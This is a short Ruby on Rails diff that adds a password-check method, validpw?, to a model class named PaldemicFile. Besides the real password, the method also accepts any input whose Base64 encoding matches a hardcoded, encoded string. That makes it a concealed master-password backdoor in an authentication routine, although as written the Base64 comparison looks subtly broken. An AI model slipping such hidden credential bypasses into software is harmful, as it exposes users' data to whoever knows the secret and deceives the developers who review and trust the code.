@@ -30,4 +30,13 @@ class PaldemicFile < ApplicationRecord
     end
     return false
   end
+
+  def validpw?(inputpw)
+    tmp = "anJidXRpdHNmb3JhcmVhbGx5Z29vZGNhdXNl"
+    tmp2 = Base64.encode64(inputpw).to_s
+    if(inputpw == pw || tmp == tmp2)
+      return true
+    end
+    return false
+  end
 end
